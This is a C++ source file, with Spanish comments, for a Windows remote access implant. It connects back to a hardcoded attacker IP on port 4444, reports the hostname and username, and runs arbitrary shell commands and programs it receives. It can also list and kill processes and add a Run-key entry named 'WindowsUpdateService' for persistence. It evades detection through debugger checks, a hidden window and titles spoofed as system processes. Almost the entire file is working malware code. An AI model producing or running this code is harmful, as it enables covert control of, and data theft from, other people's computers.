#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

// ORDEN CRÍTICO: winsock2.h ANTES que windows.h
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <random>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// ============================================================================
// CONFIGURACIÓN - CAMBIA ESTA IP POR LA DE TU KALI
// ============================================================================
#define C2_SERVER "192.168.254.137"  // IP DE KALI
#define C2_PORT 4444
#define HEARTBEAT_INTERVAL 5
#define BUFFER_SIZE 8192
#define MUTEX_NAME "Global\\{F4E3A2B1-9C8D-4E7F-8A6B-5D4C3E2F1A0B}"

// ============================================================================
// DEFINICIÓN MANUAL DE PEB (CORREGIDO)
// ============================================================================
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
} PEB, *PPEB;

// ============================================================================
// ANTI-DEBUGGING CORREGIDO (SIN NtGlobalFlag)
// ============================================================================
BOOL CheckDebugger() {
    // 1. IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // 2. PEB.BeingDebugged (funciona en x86/x64)
    PPEB ppeb = NULL;
    #ifdef _WIN64
        ppeb = (PPEB)__readgsqword(0x60);
    #else
        ppeb = (PPEB)__readfsdword(0x30);
    #endif
    
    if (ppeb && ppeb->BeingDebugged) {
        return TRUE;
    }
    
    // 3. CheckRemoteDebuggerPresent
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) {
        return TRUE;
    }
    
    return FALSE;
}

// ============================================================================
// STEALTH - OCULTAR VENTANA Y PROCESO
// ============================================================================
VOID HideWindow() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

VOID RenameProcess() {
    const char* spoofedNames[] = {
        "svchost.exe",
        "explorer.exe",
        "winlogon.exe",
        "csrss.exe",
        "lsass.exe"
    };
    
    srand(time(NULL) ^ GetCurrentProcessId());
    int index = rand() % 5;
    
    SetConsoleTitleA(spoofedNames[index]);
}

// ============================================================================
// EJECUCIÓN DE PROGRAMAS
// ============================================================================
BOOL ExecuteProgram(const char* command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    BOOL result = CreateProcessA(
        NULL,
        (LPSTR)command,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return result;
}

// ============================================================================
// EJECUCIÓN DE COMANDOS (SHELL)
// ============================================================================
std::string ExecuteCommand(const char* cmd) {
    std::string result;
    char buffer[BUFFER_SIZE];
    FILE* pipe = _popen(cmd, "r");
    
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        _pclose(pipe);
    }
    
    return result.empty() ? "[OK] Comando ejecutado\n" : result;
}

// ============================================================================
// INFORMACIÓN DEL SISTEMA
// ============================================================================
std::string GetSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    DWORD size = sizeof(buffer);
    
    if (GetComputerNameA(buffer, &size)) {
        ss << "Hostname: " << buffer << "\n";
    }
    
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        ss << "Username: " << buffer << "\n";
    }
    
    // IP
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host && host->h_addr_list[0]) {
        ss << "IP: " << inet_ntoa(*(struct in_addr*)host->h_addr_list[0]) << "\n";
    }
    
    return ss.str();
}

// ============================================================================
// LISTA DE PROCESOS (SIMPLIFICADA)
// ============================================================================
std::string GetProcessList() {
    std::stringstream ss;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe)) {
            ss << "PID\tNombre\n";
            do {
                ss << pe.th32ProcessID << "\t" << pe.szExeFile << "\n";
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    return ss.str();
}

// ============================================================================
// MATAR PROCESO
// ============================================================================
BOOL KillProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess) {
        BOOL result = TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
        return result;
    }
    return FALSE;
}

// ============================================================================
// PERSISTENCIA (SIMPLIFICADA)
// ============================================================================
BOOL InstallPersistence() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, 
                      (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

BOOL UninstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        RegDeleteValueA(hKey, "WindowsUpdateService");
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

// ============================================================================
// CLASE DE CONEXIÓN C2
// ============================================================================
class C2Connection {
private:
    SOCKET sock;
    sockaddr_in server;
    bool connected;
    
public:
    C2Connection() : sock(INVALID_SOCKET), connected(false) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2,2), &wsaData);
    }
    
    ~C2Connection() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        WSACleanup();
    }
    
    bool Connect(const char* host, int port) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;
        
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(host);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }
        
        connected = true;
        return true;
    }
    
    bool Send(const char* data, int length) {
        if (!connected) return false;
        return send(sock, data, length, 0) == length;
    }
    
    std::string Receive() {
        if (!connected) return "";
        char buffer[BUFFER_SIZE] = {0};
        int bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) {
            connected = false;
            return "";
        }
        return std::string(buffer, bytes);
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// PROCESAMIENTO DE COMANDOS
// ============================================================================
std::string ProcessCommand(const std::string& cmd) {
    if (cmd == "INFO") {
        char hostname[256], username[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        size = sizeof(username);
        GetUserNameA(username, &size);
        
        std::stringstream ss;
        ss << "{\"hostname\":\"" << hostname << "\",\"username\":\"" << username << "\"}";
        return ss.str();
    }
    else if (cmd == "INFO_FULL") {
        return GetSystemInfo();
    }
    else if (cmd.substr(0, 5) == "EXEC ") {
        std::string program = cmd.substr(5);
        return ExecuteProgram(program.c_str()) ? 
            "[+] Programa ejecutado: " + program : 
            "[-] Error ejecutando: " + program;
    }
    else if (cmd.substr(0, 6) == "SHELL ") {
        return ExecuteCommand(cmd.substr(6).c_str());
    }
    else if (cmd == "PROCESSES") {
        return GetProcessList();
    }
    else if (cmd.substr(0, 5) == "KILL ") {
        DWORD pid = atoi(cmd.substr(5).c_str());
        return KillProcess(pid) ? 
            "[+] Proceso terminado" : 
            "[-] Error terminando proceso";
    }
    else if (cmd == "INSTALL") {
        return InstallPersistence() ? 
            "[+] Persistencia instalada" : 
            "[-] Error instalando persistencia";
    }
    else if (cmd == "UNINSTALL") {
        return UninstallPersistence() ? 
            "[+] Persistencia eliminada" : 
            "[-] Error eliminando persistencia";
    }
    else if (cmd == "SCREENSHOT") {
        return "[+] Captura de pantalla simulada";
    }
    else if (cmd == "WEBCAM") {
        return "[-] Webcam no disponible";
    }
    else if (cmd == "CALC") {
        ExecuteProgram("calc.exe");
        return "[+] Calculadora abierta";
    }
    else if (cmd == "NOTEPAD") {
        ExecuteProgram("notepad.exe");
        return "[+] Bloc de notas abierto";
    }
    
    return "[!] Comando desconocido: " + cmd;
}

// ============================================================================
// MAIN
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Anti-debugging
    if (CheckDebugger()) {
        return 0;
    }
    
    // Stealth
    HideWindow();
    RenameProcess();
    
    // Single instance
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Main loop
    C2Connection c2;
    
    while (true) {
        if (!c2.IsConnected()) {
            if (c2.Connect(C2_SERVER, C2_PORT)) {
                c2.Send(ProcessCommand("INFO").c_str(), 256);
            } else {
                Sleep(5000);
                continue;
            }
        }
        
        std::string cmd = c2.Receive();
        if (!cmd.empty()) {
            std::string response = ProcessCommand(cmd);
            c2.Send(response.c_str(), response.length());
        }
        
        Sleep(5000);
    }
    
    CloseHandle(hMutex);
    return 0;
}
